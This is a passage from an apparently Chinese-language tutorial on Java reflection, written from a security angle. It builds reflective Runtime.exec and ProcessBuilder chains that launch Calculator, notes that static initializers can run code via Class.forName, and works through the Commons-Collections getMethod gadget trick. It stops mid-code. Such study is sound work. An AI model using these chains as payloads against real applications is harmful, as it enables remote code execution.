<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"><span class="comment">//对于无参的构造方法，可以直接使用Class类对象的newInstance方法</span></span><br><span class="line">Object o = personClass.newInstance();</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure>

<h2 id="获取Methods"><a href="#获取Methods" class="headerlink" title="获取Methods"></a>获取Methods</h2><blockquote>
<p>获取成员方法们：</p>
<p>Method[]  getMethods()//获取所有【public】修饰的方法，父类Object的方法也能看到</p>
<p>Method getMethod(String name，类 &lt;?&gt; … parameterTypes)</p>
<p>Method[] getDeclaredMethods()//获取所有声明方法 不考虑修饰符</p>
<p>Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"><span class="comment">//获取制定名称的方法</span></span><br><span class="line">Method eat_Method = personClass.getMethod(<span class="string">"eat"</span>);</span><br><span class="line"><span class="comment">//进而执行方法,【invoke】，它需要一个真实的对象，以及方法的实际参数列表</span></span><br><span class="line">Person pp = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//因为是空参方法，所以直接放进来一个对象就行</span></span><br><span class="line"><span class="comment">//执行方法，eat...</span></span><br><span class="line">eat_Method.invoke(pp);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Method eat_Method2 = personClass.getMethod(<span class="string">"eat"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//eat方法重载，eat方法的需要传入的参数是String类型</span></span><br><span class="line">eat_Method2.invoke(pp,<span class="string">"jiaozi"</span>);<span class="comment">//吃饺子</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Method[] methods = personClass.getMethods();<span class="comment">//获取所有public方法名</span></span><br><span class="line"><span class="comment">//获取类名</span></span><br><span class="line">String className = personClass.getName;<span class="comment">//获取类名</span></span><br><span class="line">System.out.println(className);<span class="comment">//包名.类名</span></span><br><span class="line"><span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">    <span class="comment">//也支持暴力反射：method.setAccessible(true);</span></span><br><span class="line">    System.out.println(method);</span><br><span class="line">    <span class="comment">//获取所有方法名</span></span><br><span class="line">    String methodname = method.getName();</span><br><span class="line">    System.out.println(methodname);</span><br></pre></td></tr></table></figure>

<h1 id="灵魂体现"><a href="#灵魂体现" class="headerlink" title="灵魂体现"></a>灵魂体现</h1><p>这里引入一个实际利用中的小demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(className);    </span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里分步解读：</p>
<ol>
<li>首先两个参数：<code>className</code>、<code>methodName</code>分别代表了传入的类名和方法名。</li>
<li>首先<code>Class clazz = Class.forName(className);</code>这里的意思是在字节码层面，先获取你的Class类对象<code>clazz</code>。</li>
<li>接下来<code>clazz.getMethod(methodName).invoke(clazz.newInstance());</code>这里的含义可以分步解读：<ol>
<li><code>clazz.getMethod(methodName)</code>这里我先根据传进来的方法名<code>methodName</code>获取你的Method对象;</li>
<li>接下来<code>.invoke(clazz.newInstance())</code>这个含义是对于我获取的method方法对象，我要执行这个方法，那么问题来了，我如何才能执行这个方法呢？？？</li>
<li>这里我先<code>clazz.newInstance()</code>，这一手的含义是我要先生成一个指定类的对象，那么如何生成呢？之前我已经获取了Class类对象，那么就可以用这个类对象来生成这个类的实例化对象</li>
<li><code>clazz.newInstance()</code>这样就可以生成一个实例化对象了</li>
<li>那么有了类的实例化对象之后，直接放入invoke参数里面，就可以凭借我们之前的Method对象来执行这个特殊的<code>className</code>方法了!</li>
</ol>
</li>
</ol>
<p>说了这么多嗷，我分步拆开来写一下，会更清晰一些：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  		<span class="comment">//首先找到类对象</span></span><br><span class="line">  		Class clazz = Class.forName(className);</span><br><span class="line">  		<span class="comment">//根据类对象找到Method方法对象</span></span><br><span class="line">      Method mtd = clazz.getMethod(methodName);</span><br><span class="line">  		<span class="comment">//动态生成类实例化对象obj</span></span><br><span class="line">      Object obj = clazz.newInstance();</span><br><span class="line">  		<span class="comment">//调用类中方法mtd</span></span><br><span class="line">      mtd.invoke(obj); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>以下一步步使用反射机制实现<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>这个语句</p>
<ul>
<li>getRuntime()：其实就是<strong>Runtime类获取对象</strong>的方式，等于new一个Runtime类。之所以封装成一个函数是为了不调用一次建立一个对象，只获取一个对象来执行操作。</li>
<li>exec()：调用exec函数</li>
<li>calc.exe：调用计算器程序</li>
</ul>
<h2 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h2><p>这里我再写一个小demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始块</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">"Empty block initial %s\n"</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态初始块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">"Static initial %s\n"</span>, TrainPrint<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">"Initial %s\n"</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我写一个测试类，对于这个测试类，它有初始块，静态初始块，构造函数。</p>
<p>那么下面我来获取它的Class对象，想看看当这个<code>TrainPrint</code>测试类加载进内存之后，哪些部分执行了，好主意，说写就写：</p>
<p>首先<strong>类的初始化</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> domain.TrainPrint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">initTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">"domain.TrainPrint"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：<code>Static initial class domain.TrainPrint</code></p>
<p>这说明当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。</p>
<p>那么<strong>类的实例化</strong>呢:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> domain.TrainPrint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">initTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TrainPrint test= <span class="keyword">new</span> TrainPrint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Static initial class domain.TrainPrint</span><br><span class="line">Empty block initial class domain.TrainPrint</span><br><span class="line">Initial class domain.TrainPrint</span><br></pre></td></tr></table></figure>

<p>这也暴露了顺序：<code>静态初始块</code>-&gt;<code>初始块</code>-&gt;<code>构造函数</code></p>
<p>补充：</p>
<p>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code>-&gt;<code>父类初始块</code>-&gt;<code>父类构造函数</code>-&gt;<code>子类初始块</code>-&gt;<code>子类构造函数</code><br>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code></p>
<p>以上对于类初始化的说明其实就是说，单独一个Class.forName()，在<strong>类静态初始块可控的情况</strong>下，可以执行恶意代码。</p>
<h2 id="调用内部类"><a href="#调用内部类" class="headerlink" title="调用内部类"></a>调用内部类</h2><p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： <code>C1.class</code> 和 <code>C1$C2.class</code>，可以把他们看作两个无关的类。</p>
<p><code>Class.forName(&quot;C1$C2&quot;)</code>可以调用这个内部类。</p>
<p>我们可以通过<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>来获取类（java.lang.Runtime是Runtime类的完整路径）</p>
<h2 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h2><p>Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class)</code></p>
<h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p>invoke方法位于Method类下，其作用是传入参数，执行方法，<br><code>public Object invoke(Object obj, Object... args)</code><br>它的第一个参数是执行method的实例化对象：</p>
<ul>
<li>如果这个方法是一个普通方法，那么第一个参数是类对象。</li>
<li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，null也行），它接下来的参数才是需要传入的参数。</li>
</ul>
<p>由于我们的exec函数是一个普通方法，需要传入类对象，即<code>invoke(类对象，exec方法传入的参数)</code> 。<br>之前说到Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。</p>
<p>获取类对象：</p>
<figure class="highlight plain"><figcaption><span>(由于getRuntime是一个静态方法，invoke传入Runtime类，进行调用)</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">`invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))，&quot;calc.exe&quot;)`</span><br><span class="line"></span><br><span class="line">合并：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).</span><br><span class="line">                invoke(</span><br><span class="line">                        Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(</span><br><span class="line">                                Class.forName(&quot;java.lang.Runtime&quot;)),&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200411221213662.png" alt="image-20200411221213662"></p>
<p>再简化一下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "/Applications/Calculator.app/Contents/MacOS/Calculator");</span><br></pre></td></tr></table></figure>

<p>详细解读，这里是一个疯狂套娃的过程：</p>
<ol>
<li>首先先要找到类对象，clazz，不多说了</li>
<li>接下来我要告诉这个类对象我要执行的方法是<code>exec</code>，这个exec方法接受的参数类型是<code>String</code>类型，当然就是恶意命令字符串</li>
<li>那么我们的invoke函数需要的操作就是<code>invoke(类对象，exec方法等待接收的参数)</code>，那么问题来了：Runtime类不允许<code>newInstance()</code>来实例化对象！！！但是他允许通过<code>getRuntime</code>方法返回一个对象，那么我就用getRuntime方法来返回一个对象！</li>
<li>现在开始疯狂套娃！</li>
<li>首先既然你不允许instance，那么我就在那个类对象的位置“套”出来一个对象！思路其实就是既然我没办法给你在那个位置“放”上一个实例化对象，那么我就在你的位置上<strong>使用反射invoke执行<code>getRuntime</code>方法</strong>，不就可以了么！</li>
<li>那么就有了简化版代码！</li>
<li>这里仔细看，可以看到，其实<code>getRuntime</code>方法它也是一个无参构造方法！</li>
</ol>
<h2 id="指定的构造方法生成类的实例"><a href="#指定的构造方法生成类的实例" class="headerlink" title="指定的构造方法生成类的实例"></a>指定的构造方法生成类的实例</h2><p>继续举一个演化成反射机制的执行命令payload的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">paramList.add(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(paramList);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>

<p>可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。</p>
<p>ProcessBuilder有两个构造函数：</p>
<ul>
<li><code>public ProcessBuilder(List command)</code></li>
<li><code>public ProcessBuilder(String... command)</code>(此处，String<code>...</code>这种语法表示String参数数量是可变的，与String[]一样)</li>
</ul>
<p><code>getConsturctor()</code>函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，<code>getConsturctor(参数类型)</code></p>
<p>选定后我们可以通过<code>newInstance()</code>,并传入构造函数的参数执行构造函数，即<code>newInstance(传入的构造函数参数)</code>。</p>
<p>start函数不是一个静态函数,需要传入类的实例，所以这里可以继续使用反射：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("/Applications/Calculator.app/Contents/MacOS/Calculator")));</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200411224713717.png" alt="image-20200411224713717"></p>
<p>这里还有一种方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个可以传入多个字符串</span></span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>

<p>那么payload就这样写吧：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)).start();</span><br></pre></td></tr></table></figure>

<p>但是实际上我们这样调用是会报错的，因为newInstance函数接受参数是一个<code>Object..</code>也就是Object数组，它会完美契合我们提供的String[]，剥去一层数组。</p>
<p>那就再套一层：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<h2 id="执行私有方法"><a href="#执行私有方法" class="headerlink" title="执行私有方法"></a>执行私有方法</h2><p>以上都是方法或构造方法是public函数，但是如果是私有方法，该如何调用？<br>之前用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor：</p>
<ul>
<li>getMethod等方法获取的是当前类中所有<strong>公共</strong>方法，包括从父类继承的方法</li>
<li>getDeclared等方法获取的是<strong>当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</strong></li>
</ul>
<p>之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我就来调用Runtime的构造方法来获取一个实例来执行计算器弹出：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">Constructor m = clazz.getDeclaredConstructor(); </span><br><span class="line">m.setAccessible(<span class="keyword">true</span>); <span class="comment">//暴力反射</span></span><br><span class="line">clazz.getMethod("exec", String.class).invoke(m.newInstance(), "/Applications/Calculator.app/Contents/MacOS/Calculator");</span><br></pre></td></tr></table></figure>

<p>在获取到私有方法后，通过<code>setAccessible(true)</code>可以打破私有方法访问限制，从而进行调用。</p>
<h1 id="从Commons-collections收获的一点反思"><a href="#从Commons-collections收获的一点反思" class="headerlink" title="从Commons-collections收获的一点反思"></a>从Commons-collections收获的一点反思</h1><p>对于正常的反射模板：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br></pre></td></tr></table></figure>

<p>但其实我们很容易忽略反射机制中调用的函数实际上可以在两个不同的class中调用，<strong>就像好比有一个函数可以在两个class中调用</strong>。</p>
<p>在Commons-Collections的环境中，我们是没法得到<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(...)</code>的，但是可以得到<code>Class.forName(&quot;java.lang.Class&quot;).getMethod(...)</code>。</p>
<p>可以理解为我们可以抓到<code>Runtime</code>的父类，那么就可以得到以下途径进行变形：</p>
<ul>
<li>用反射机制去调用反射机制中使用的函数getMethod</li>
<li>使用invoke传入的obj去指定getMethod的当前的调用环境（在实际代码执行中是this变量的区别）</li>
</ul>
<p>继续看一下Class类中getMethod方法的接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span><span class="comment">////&lt;?&gt;... 表示任意类型任意数量的Class数组</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="keyword">true</span>);</span><br><span class="line">    Method method = getMethod0(name, parameterTypes, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(getName() + <span class="string">"."</span> + name + argumentTypesToString(parameterTypes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们传数组，来拿到<code>getmethod</code>这个方法不就行了么：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Method method1= Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">        .getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;);//根据getMethod方法接口进行封装</span><br></pre></td></tr></table></figure>

<p>以下套娃警告！</p>
<p>这里的Class类，它有所有方法，我们就是先拿到<code>getmethod</code>这个方法，这里是为什么呢？因为对于想用反射来调用方法其他类的方法，你必须会用到<code>getmethod</code>方法（忘了的向上翻模板），这里就相当于我先把梯子拿到！</p>
<p>那么有了<code>getmethod</code>方法之后，我需要一个obj对象来调用呀，这个obj其实就是<code>java.lang.Runtime</code>。之前也说了，这个对象很有脾气，需要执行这个类下面的<code>Runtime</code>方法，才能实例化一个<code>Runtime</code>对象。</p>
<p>结合上面刚刚获取的<code>getmethod</code>梯子方法，继续写吧：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下语句执行结果等同于Class.forName("java.lang.Runtime").getMethod(getRunime)</span></span><br><span class="line">method1.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//用于对比：以下语句等同于Class.forName("java.lang.Class").getMethod(getRunime)</span></span><br><span class="line"><span class="comment">//method1.invoke(Class.forName("java.lang.Class"),"getRuntime",new Class[0]);</span></span><br></pre></td></tr></table></figure>

<p>合起来就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.正常的反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">// 2.经过变形的反射调用，需要绕一圈</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">    .getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)//得到getMethod方法</span><br><span class="line">   .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//new Class[0]其实就是占位</span></span><br></pre></td></tr></table></figure>

<p><code>new Class[0]</code>其实就是占位，因为阅读源码能看到invoke方法参数规范，是硬性标准需要两个参数的，第二个是一个<code>Object</code>类的数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException,</span></span><br><span class="line"><span class="function">       InvocationTargetException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!override) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123;</span><br><span class="line">            Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">            checkAccess(caller, clazz, obj, modifiers);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MethodAccessor ma = methodAccessor;             <span class="comment">// read volatile</span></span><br><span class="line">    <span class="keyword">if</span> (ma == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ma = acquireMethodAccessor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ma.invoke(obj, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在我们只是以<code>Class.forName(&quot;java.lang.Class&quot;)</code>开头获取到了Runtime类下的getRuntime方法。还没有执行。</p>
<h2 id="神奇的invoke参数"><a href="#神奇的invoke参数" class="headerlink" title="神奇的invoke参数"></a>神奇的invoke参数</h2><p>自己写完总觉得invoke参数奇奇怪怪的，淦，研究一下。</p>
<p>invoke有一个非常神奇的特性，它不会那么严格地校验obj。回顾之前总结的invoke传参规则：</p>
<blockquote>
<p>它的第一个参数是执行method的对象obj：</p>
<ul>
<li>如果这个方法是一个普通方法，那么第一个参数是类对象</li>
<li>如果这个方法是一个静态方法，那么第一个参数是类<br>它接下来的参数才是需要传入的参数。</li>
</ul>
</blockquote>
<p>但是，<strong>传入的第一个参数其实不一定要是正确的类或者类对象!</strong></p>
<p>下面一个小例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main函数</span></span><br><span class="line">Class.forName(<span class="string">"a"</span>).getMethod(<span class="string">"print"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//内部类：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照规则，print函数是一个<strong>静态方法</strong>，实际上我们应该invoke传入一个a的类。但是以上代码的执行结果却是成功的：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200412135058766.png" alt="image-20200412135058766"></p>
<p>但是如果<code>print</code>方法不是静态防范时就会执行失败：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200412135158822.png" alt="image-20200412135158822"></p>
<p>这是因为invoke函数null抛出报错的机制导致的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* <span class="meta">@exception</span> NullPointerException      </span><br><span class="line">* <span class="keyword">if</span> the specified object is <span class="keyword">null</span> and the method is an instance method. <span class="comment">//obj为null，并且method是一个实例method</span></span><br><span class="line">*/</span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当method是一个普通函数时，传入obj不能为null，并且其类对象要与方法匹配；但是当method是一个静态函数时，就很随便了(可能是因为压根不会被用到吧)。</p>
<p>这里我迷茫了好久，知道我看到这样一句话才弄懂：</p>
<blockquote>
<p><strong>类实例</strong>是其他类的实例，<strong>类</strong>实际上是Class.class这个类的实例。<br>这边之前的疑问是，getMethod不是静态方法而invoke中传入的是类而不是类实例。<br>实际上因为getMethod本来就是class类中的方法，而<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>获取到的class类的实例<br>我们调用getMethod传入的不是之前的模糊类的概念，而是class类的实例（类实例），所以这里是没毛病的调用class类下的非静态方法，传入class类实例。</p>
</blockquote>
<h2 id="回来继续构造调用"><a href="#回来继续构造调用" class="headerlink" title="回来继续构造调用"></a>回来继续构造调用</h2><p>上面我们只是获取到了getRuntime方法，我们还没有调用这个方法获取其Runtime对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通调用形式</span></span><br><span class="line">Runtime.getRuntime()</span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br><span class="line"><span class="comment">// 经过变形的反射调用</span></span><br><span class="line">Method method = (Method) Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">                .getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)//得到getMethod方法，这个方法需要两个型参，这里要列好，分别是String和Class</span><br><span class="line">  .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//调用getMethod方法，得到getRuntime方法</span></span><br><span class="line"><span class="comment">//以上等于执行Class.forName("java.lang.Runtime").getMethod("getRuntime")</span></span><br><span class="line"><span class="comment">//调用Runtime.getRuntime函数，传入的obj根据上面的分析可以随便写</span></span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.String"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>



<h1 id="搞懂invoke函数"><a href="#搞懂invoke函数" class="headerlink" title="搞懂invoke函数"></a>搞懂invoke函数</h1><p>直接上源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Method</span> <span class="keyword">extends</span> <span class="title">AccessibleObject</span> <span class="keyword">implements</span> <span class="title">GenericDeclaration</span>,<span class="title">Member</span>...</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">Object</span> <span class="title">invoke</span>(<span class="title">Object</span> <span class="title">obj</span>, <span class="title">Object</span>... <span class="title">args</span>)</span></span><br><span class="line"><span class="class">        <span class="title">throws</span> <span class="title">IllegalAccessException</span>, <span class="title">IllegalArgumentException</span>,</span></span><br><span class="line"><span class="class">           <span class="title">InvocationTargetException</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!override) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123;</span><br><span class="line">                Class&lt;?&gt; caller = Reflection.getCallerClass(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                checkAccess(caller, clazz, obj, modifiers);</span><br><span class="line">            &#125;</span><br><span class="line">        